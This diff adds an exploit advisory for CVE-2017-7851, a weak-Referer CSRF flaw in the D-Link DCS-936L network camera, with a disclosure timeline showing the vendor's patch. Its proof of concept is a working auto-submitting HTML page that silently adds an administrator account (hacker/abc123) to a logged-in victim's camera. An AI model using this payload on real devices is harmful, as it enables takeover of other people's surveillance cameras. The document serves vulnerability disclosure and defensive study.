@@ -1,0 +1,73 @@
+# Exploit Title: [D-Link DCS-936L network camera incomplete/weak CSRF protection vulnerability]
+# Date: [26/03/2017]
+# Exploit Author: [SlidingWindow] , Twitter: @Kapil_Khot
+# Vendor Homepage: [http://us.dlink.com/product-category/home-solutions/view/network-cameras/]
+# Version: [Tested on DCS-936L with firmware version 1.03. Other versions/models are also be affected]
+# Tested on: [DCS-936L with firmware version 1.02.01]
+# CVE : [CVE-2017-7851]
+
+==================
+#Product:-
+==================
+Small and unobtrusive, SecuriCam™ IP surveillance solutions from D-Link allow you to monitor your offices or warehouses from anywhere - at anytime. Extreme Low LUX optics, 2 way audio, and full pan/tilt/zoom manipulation provide everything an SMB needs to safeguard their valuable resources.
+
+==================
+#Vulnerability:-
+==================
+D-Link DCS-936L network camera incomplete/weak CSRF protection vulnerability. 
+
+========================
+#Vulnerability Details:-
+========================
+
+=============================================================================================================================
+D-Link DCS-936L network camera incomplete/weak CSRF protection vulnerability (CVE-2017-7851)
+=============================================================================================================================
+D-Link DCS-936L devices with firmware 1.02.01 have CSRF. If a victim is logged into the camera's web console and visits a malicious site hosting a <Target_Device_IP.HTML> from another tab in the same browser, the malicious site can send requests to the victim's device. An attacker can add a new user, replace the firmware image with a malicious one, or connect the victim's device to a rogue Wireless Network.
+
+An attacker can easily find out public IP address of victim's device on Shodan or similar search engines to create <Target_Device_IP.HTML> file. Victim must be logged into the camera's web console and visit attacker's site from another tab in the same browser.
+
+#Proof-of-Concept:-
+-------------------
+D-Link DCS-936L prevents CSRF attack by looking at ‘Referer’ header. The ‘Referer’ IP should match with the one in ‘HOST’ header. If it does not, HTTP 403 is returned in the response. However, this device does not perform a strict check on ‘Referer’ header. It seems that it looks for the device’s IP address (which is the one in ‘HOST’ header) anywhere in the ‘Referer’ header. If found, it happily accepts the request.
+An unauthenticated, remote attacker could host a malicious site that makes requests to the victim’s device without having credentials. In a targeted attack, an attacker needs to trick victim to visit a malicious site that exploits this vulnerability.
+
+1. Attacker hosts a ‘<target_ip>.html’ on <attacking_ip>
+
+	<html>
+	<body>
+		<form id="CSRF" action="http://<target_ip>/eng/admin/tools_admin.cgi" method="POST">
+			<input type="hidden" name="user" value="hacker">
+			<input type="hidden" name="action" value="set">
+			<input type="hidden" name="password" value="abc123">
+			<input type="hidden" name="confirmPassword" value="abc123">
+		</form>
+
+			<script>
+					window.onload = function(){
+							document.forms['CSRF'].submit()
+					}
+			</script>
+
+	</body>
+
+	</html>
+
+
+2. Victim logs into his device.
+3. Victim then visits attackers site http://<attacking_ip>/<target_ip>.html 
+4. Above request adds a new user ‘Hacker’ which reboots the web server.
+6. Browser sends add new user request to the target device <target_ip>. Victim's browser sets 'Referer' header to 'http://<attacking_ip>/<target_ip>.html'. As this contains the IP address of the device (<target_ip>), this request is processed successfully.
+7. Server response shows user hacker added successfully:
+8. Attacker can now log into the device as hacker/abc123
+
+===================================
+#Vulnerability Disclosure Timeline:
+===================================
+
+26/03/2017: First email to disclose vulnerability to D-Link incident response team.
+26/03/2017: Vendor acknowledged the report.
+25/05/2017: Vendor confirmed that development has been completed and it's undergoing security audit.
+13/10/2017: Firmwared released to production: ftp://ftp2.dlink.com/PRODUCTS/DCS-936L/REVA/DCS-936L_REVA_FIRMWARE_v1.05.07.zip
+13/11/2017: DCS-936L Firmware Release Notes: ftp://ftp2.dlink.com/PRODUCTS/DCS-936L/REVA/DCS-936L_REVA_RELEASE_NOTES_v1.05.07.pdf
+15/11/2017: Published CVE-2017-7851
